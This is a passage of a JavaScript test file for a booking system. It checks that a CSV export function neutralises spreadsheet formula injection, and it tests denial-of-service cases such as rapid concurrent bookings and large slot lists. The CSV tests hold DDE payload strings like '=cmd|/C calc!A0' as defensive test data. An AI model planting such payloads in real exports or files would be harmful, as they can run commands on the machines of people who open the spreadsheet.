      // Prevent CSV formula injection (CWE-1236): escape prefix that Excel/Sheets evaluate as formulas
      if (/^[=+\-@\t|]/.test(s)) s = "'" + s;
      // Escape newlines within values to prevent row injection
      s = s.replace(/\r?\n/g, ' ');
      return /[",]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
    };

    // Formula without " or , or newline -> now escaped with prefix
    const malicious = '=cmd|/C calc!A0';
    const escaped = csv(malicious);
    // FIX: csv() now prepends single quote -> neutralizes formula evaluation in Excel
    expect(escaped).toBe("'=cmd|/C calc!A0");
    expect(escaped).not.toBe(malicious);

    // Also test other formula prefixes
    expect(csv('+cmd|/C calc!A0')).toBe("'+cmd|/C calc!A0");
    expect(csv('-cmd|/C calc!A0')).toBe("'-cmd|/C calc!A0");
    expect(csv('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csv('\t=cmd')).toBe("'\t=cmd");
    expect(csv('|cmd')).toBe("'|cmd");

    // Normal values should not be affected
    expect(csv('Normal Name')).toBe('Normal Name');
    expect(csv('12345')).toBe('12345');
    expect(csv('hello world')).toBe('hello world');
    // Note: '= not formula' is also escaped because Excel can evaluate any '=' prefix
    expect(csv('= not formula')).toBe("'= not formula");
  });
});

// ======================================================================
// SEC-37 -> SEC-39: Denial-of-Service (DoS) Vectors
// ======================================================================

describe('SEC: DoS Vectors', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-37: Rapid-fire booking calls (rate limiting)', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // batch 1: config, registration, cancelledQuota
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      // batch 2: slots
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 100, remaining: 50 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 100, remaining: 50 }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const promises = Array.from({ length: 10 }, () =>
      bookDb('user@test.com', {
        empCode: '262010', fullName: 'A', bu: 'IT',
        speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
      }),
    );

    const results = await Promise.all(promises);
    results.forEach((r) => {
      expect(typeof r.ok).toBe('boolean');
    });
  });

  it('SEC-38: Extremely large slot list -> initDb handles gracefully', async () => {
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    const manySlots = Array.from({ length: 1000 }, (_, i) => ({
      id: `SP-${i}`,
      data: () => ({
        type: 'Speaking',
        date: '2026-06-22',
        startMin: 540 + (i % 480),
        endMin: 570 + (i % 480),
        capacity: 10,
        remaining: 10,
      }),
    }));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap(manySlots));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await initDb('user@test.com');
    expect(result.slots).toHaveLength(1000);
  });

  it('SEC-39: Repeated checkIneligibility calls -> non-blocking, no memory leak', async () => {
    mockGetDoc.mockRejectedValue(new Error('Network error'));
    const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});

    const results = await Promise.all(
      Array.from({ length: 50 }, () => checkIneligibility('262010')),
    );

    results.forEach((r) => expect(r).toBeNull());
    consoleSpy.mockRestore();
  });
});
